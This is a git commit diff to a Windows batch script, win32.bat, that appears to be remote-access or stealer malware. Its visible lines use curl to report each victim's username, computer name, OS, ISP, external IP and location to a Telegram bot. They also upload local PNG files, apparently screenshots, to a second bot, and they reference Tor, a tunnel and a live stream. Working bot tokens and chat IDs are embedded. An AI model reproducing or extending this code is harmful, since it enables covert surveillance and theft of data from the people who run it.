ed55766c1e1dc34f467cad639ec9674e3cc909d0
cryptedodissey <90626486+cryptedodissey@users.noreply.github.com>
2023-07-16 03:00:23 +0200

    Update win32.bat

--- win32.bat
+++ win32.bat
@@ -72,7 +72,7 @@ for %%f IN (%temporary:~3%/playlist.m3u8) DO (
 tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
 if not errorlevel 1 (echo.) else (taskkill /f /im "Localtunnel.exe" && set WS=Off && set "newtemp= ")
 tasklist /fi "imagename eq ffmpeg.exe" | find /i "ffmpeg.exe" > nul
-if not errorlevel 1 (echo.) else (taskkill /f /im "Localtunnel.exe" && set WS=Off && set "newtemp=Off")
+if not errorlevel 1 (echo.) else (set "newtemp=Off")
 
 "%environment%\curl.exe" -k %proxy% -F text="NEW CONNECTION: %username%@%computername% [%WinEdition% %OSArchitecture%] [%ISP% (%ExtIP%)] [%City% (%Region%, %Country%)] [{Tor is enabled: %TorStatus%] [Web Server:%WS% ] [Live Stream: %WS%!newtemp!] " https://api.telegram.org/bot5919717252:AAE3HbKOIhMcsP9NiKLAAZD8Nf9HQhRZgIY/sendMessage?chat_id=-854583574
 for %%# in ("*.png") do "%environment%\curl.exe" -k %proxy% -F document=@"%%~f#" https://api.telegram.org/bot6053961003:AAENR1HtCpNA7AJaWN1LUnPXxuEsoogKBG8/sendDocument?chat_id=-1001930176759 
